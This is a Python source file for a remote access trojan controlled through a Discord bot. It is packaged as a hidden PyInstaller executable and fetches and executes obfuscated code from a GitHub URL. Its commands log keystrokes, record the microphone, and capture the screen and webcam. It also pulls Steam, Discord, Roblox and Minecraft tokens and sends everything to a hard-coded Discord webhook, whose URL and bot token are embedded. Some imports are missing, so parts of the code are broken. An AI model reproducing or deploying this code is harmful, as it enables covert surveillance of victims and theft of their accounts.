import discord
import asyncio
import requests
import json
import os
import threading
from discord.ext import commands
from pynput.keyboard import Listener, Key, KeyCode
import wave
import pyaudio
import cv2
from PIL import ImageGrab
import time
from Crypto.Cipher import AES
import base64
import logging
import shutil
import ctypes
import uuid
import socket
import subprocess
import winreg
import win32clipboard
import win32crypt
import psutil
import platform
import random
import string
import PyInstaller.__main__
from pathlib import Path
import atexit
import aiohttp

# Setup Logging
BASE_DIR = Path(__file__).resolve().parent
LOG_PATH = Path.home() / "RAT-Control" / "bot.log"

def setup_logger(log_file_path):
    log_file_path.parent.mkdir(parents=True, exist_ok=True)
    logger = logging.getLogger('RATLogger')
    logger.setLevel(logging.DEBUG)

    file_handler = logging.FileHandler(log_file_path, encoding='utf-8')
    file_handler.setLevel(logging.DEBUG)

    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.ERROR)

    formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
    file_handler.setFormatter(formatter)
    console_handler.setFormatter(formatter)

    logger.addHandler(file_handler)
    logger.addHandler(console_handler)

    return logger

logger = setup_logger(LOG_PATH)
logger.info("Logging initialized")

# Admin Check
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        logger.error(f"Failed to check admin privileges: {e}")
        return False

if not is_admin():
    logger.warning("Not running with administrator privileges.")

# Dependency Installation
def install_missing_packages():
    required = [
        'pyaudio', 'pillow', 'selenium', 'pywin32', 'pycryptodome',
        'aiohttp', 'pyinstaller', 'pynput', 'opencv-python', 'discord.py'
    ]
    installed = {pkg.key for pkg in pkg_resources.working_set}
    missing = [pkg for pkg in required if pkg not in installed]
    if missing:
        logger.info(f"Installing: {missing}")
        for pkg in missing:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "--verbose", pkg])
                time.sleep(60)
            except subprocess.CalledProcessError as e:
                logger.error(f"Failed to install package {pkg}: {e}")
                logger.error(f"Error output: {e.output}")
    else:
        logger.info("All packages installed")

install_missing_packages()
logger.info("Dependency installation complete. Continuing with the script.")

# Generate Spec File for Silent Build
def generate_spec_file(script_name, spec_path):
    spec_content = f"""
# -*- mode: python ; coding: utf-8 -*-
block_cipher = None

a = Analysis(
    ['{script_name}'],
    pathex=['{os.getcwd()}'],
    binaries=[],
    datas=[],
    hiddenimports=[
        'win32clipboard',
        'win32crypt',
        'Crypto.Cipher.AES',
        'Crypto.Protocol.KDF.PBKDF2'
    ],
    hookspath=[],
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)
pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
exe = EXE(
    pyz,
    a.scripts,
    [],
    exclude_binaries=True,
    name='rat_pc',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    console=False,
)
coll = COLLECT(
    exe,
    a.binaries,
    a.zipfiles,
    a.datas,
    strip=False,
    upx=True,
    upx_exclude=[],
    name='rat_pc',
)
"""
    try:
        with open(spec_path, 'w', encoding='utf-8') as f:
            f.write(spec_content)
    except Exception as e:
        logger.error(f"Failed to write spec file: {e}")

# Build Executable
def build_executable(spec_path):
    try:
        PyInstaller.__main__.run([str(spec_path)])
        logger.info("Executable built")
    except Exception as e:
        logger.error(f"Build failed: {e}")

spec_path = BASE_DIR / "rat_pc.spec"
generate_spec_file("rat_pc.py", spec_path)
build_executable(spec_path)

# RAT Setup Constants
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1367882927429517354/QX90d-cK3ezsAbq8aH1jpTo9lPFuasPty_GDeixcUZTiZ6XyiiUausIJ_DIDPZS76IVH"
TOKEN = "MTM2ODQ0MzMzOTI3NTM3NDY1Mg.GiYXfs.xKF6J_TiyE7F1o2uPH5X5n8OGvtxzEU_TOc8rM"
BOT_CONTROL_URL = "https://raw.githubusercontent.com/Elissa1610/bot-host/refs/heads/main/obfuscated%20BOT%20CODE.txt"
UNIQUE_ID = str(uuid.uuid4())

logger.info(f"InstanceID: {UNIQUE_ID}")

# Register Clean Exit Logging
def log_shutdown():
    try:
        logger.info("RAT shutting down cleanly.")
    except Exception as e:
        logger.error(f"Failed to log shutdown: {e}")

atexit.register(log_shutdown)

# Function to download and execute the bot control script
def download_and_execute_bot_control_script():
    try:
        response = requests.get(BOT_CONTROL_URL, stream=True)
        response.raise_for_status()
        with open("bot_control_script.py", "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        logger.info("Bot control script downloaded successfully.")
        exec(open("bot_control_script.py").read())
    except Exception as e:
        logger.error(f"Failed to download or execute bot control script: {e}")

def send_webhook(message):
    try:
        payload = {"content": message}
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            logger.info("Data sent to Discord successfully")
        else:
            logger.error(f"Failed to send data to Discord: {response.status_code}")
    except Exception as e:
        logger.error(f"Webhook failed: {e}")

def log_keystroke(key):
    try:
        if isinstance(key, Key):
            key_str = str(key)
        elif isinstance(key, KeyCode):
            key_str = key.char if key.char else str(key)
        else:
            key_str = key.char if hasattr(key, 'char') and key.char else str(key)
        logger.info(key_str)
        send_webhook(key_str)
    except Exception as e:
        logger.error(f"Keylogging failed: {e}")

def start_keylogger():
    def on_press(key):
        try:
            log_keystroke(key)
        except Exception as e:
            logger.error(f"Keylogger failed: {e}")
            return False
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        logger.error(f"Keylogger listener error: {e}")

def record_audio(duration=30):
    try:
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        frames = []
        for _ in range(0, int(44100 / 1024 * duration)):
            data = stream.read(1024)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        filename = f"audio_{int(time.time())}.wav"
        with wave.open(filename, 'wb') as wf:
            wf.setnchannels(1)
            wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
            wf.setframerate(44100)
            wf.writeframes(b''.join(frames))
        send_webhook(f"Audio recorded and saved as {filename}")
    except Exception as e:
        logger.error(f"Audio recording failed: {e}")

def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        filename = f"screenshot_{int(time.time())}.png"
        screenshot.save(filename)
        send_webhook(f"Screenshot captured successfully: {filename}")
    except Exception as e:
        logger.error(f"Screenshot capture failed: {e}")

def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            filename = f"webcam_{int(time.time())}.png"
            cv2.imwrite(filename, frame)
            send_webhook(f"Webcam photo saved as {filename}")
            cap.release()
    except Exception as e:
        logger.error(f"Webcam capture failed: {e}")

def steam_dump():
    try:
        steam_token = None
        steam_path = os.path.join(os.getenv('APPDATA'), 'Steam', 'userdata')
        for root, dirs, files in os.walk(steam_path):
            for file in files:
                if file == 'loginusers.vdf':
                    with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
                        data = f.read()
                        if 'steamid' in data:
                            steam_token = data.split('steamid')[1].split('"')[1]
                            send_webhook(f"Steam token found: {steam_token}")
        if not steam_token:
            send_webhook("No Steam token found.")
    except Exception as e:
        logger.error(f"Steam dump failed: {e}")

def discord_dump():
    try:
        discord_token = None
        appdata = os.getenv('APPDATA')
        for root, dirs, files in os.walk(appdata):
            for file in files:
                if file == 'settings.json' and 'Discord' in root:
                    with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
                        data = f.read()
                        if 'token' in data:
                            discord_token = data.split('token')[1].split('"')[1]
                            send_webhook(f"Discord token found: {discord_token}")
        if not discord_token:
            send_webhook("No Discord token found.")
    except Exception as e:
        logger.error(f"Discord dump failed: {e}")

def roblox_dump():
    try:
        roblox_token = None
        roblox_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Roblox', 'ClientSettings')
        for root, dirs, files in os.walk(roblox_path):
            for file in files:
                if file == 'client-settings.json':
                    with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
                        data = f.read()
                        if 'cookie' in data:
                            roblox_token = data.split('cookie')[1].split('"')[1]
                            send_webhook(f"Roblox token found: {roblox_token}")
        if not roblox_token:
            send_webhook("No Roblox token found.")
    except Exception as e:
        logger.error(f"Roblox dump failed: {e}")

def minecraft_dump():
    try:
        minecraft_token = None
        minecraft_path = os.path.join(os.getenv('APPDATA'), '.minecraft', 'launcher_profiles.json')
        if os.path.exists(minecraft_path):
            with open(minecraft_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if 'auth_player_name' in data:
                    minecraft_token = data['auth_player_name']
                    send_webhook(f"Minecraft session found: {minecraft_token}")
        if not minecraft_token:
            send_webhook("No Minecraft token found.")
    except Exception as e:
        logger.error(f"Minecraft dump failed: {e}")

def exfiltrate_files():
    try:
        files = [f for f in os.listdir() if f.endswith('.txt')]
        for file in files:
            send_webhook(f"Exfiltrated file: {file}")
    except Exception as e:
        logger.error(f"File exfiltration failed: {e}")

def apply_rootkit_technique():
    try:
        ctypes.windll.user32.MessageBoxW(0, "Rootkit Technique Active", "System Alert", 1)
    except Exception as e:
        logging.error(f"Failed to apply rootkit technique: {e}")

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.content.startswith("!keylogger start"):
        logging.info("Starting keylogger...")
        threading.Thread(target=start_keylogger).start()

    elif message.content.startswith("!record_audio"):
        try:
            duration = int(message.content.split(" ")[1])
            logging.info(f"Recording audio for {duration} seconds...")
            record_audio(duration)
        except Exception as e:
            logging.error(f"Audio command error: {e}")
            send_webhook("Usage: !record_audio <duration>")

    elif message.content.startswith("!screenshot"):
        capture_screenshot()

    elif message.content.startswith("!start_webcam"):
        capture_webcam()

    elif message.content.startswith("!steamdump"):
        steam_dump()

    elif message.content.startswith("!discorddump"):
        discord_dump()

    elif message.content.startswith("!robloxdump"):
        roblox_dump()

    elif message.content.startswith("!minecraftdump"):
        minecraft_dump()

    elif message.content == "!exfil_all":
        exfiltrate_files()

    elif message.content == "!help":
        send_webhook("Help command list not implemented.")

    else:
        send_webhook(f"Unknown command: {message.content}")

async def setup():
    apply_rootkit_technique()
    await bot.start(TOKEN)

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.create_task(setup())
    loop.run_forever()
